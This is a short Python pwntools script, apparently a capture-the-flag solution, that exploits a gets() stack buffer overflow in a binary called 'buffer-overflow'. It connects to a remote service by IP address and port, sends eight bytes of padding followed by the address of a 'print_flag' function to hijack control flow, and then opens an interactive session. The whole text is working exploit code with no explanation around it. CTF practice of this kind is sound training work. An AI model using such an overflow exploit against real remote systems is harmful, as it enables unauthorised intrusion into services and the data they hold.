from pwn import *

elf = ELF('./buffer-overflow')
#io = process(elf.path)
io = remote('34.170.146.252', 24310)

payload = b'a' * 0x8
payload += p64(elf.symbols['print_flag'])

io.sendlineafter(b'gets to buf: ', payload)
io.interactive()
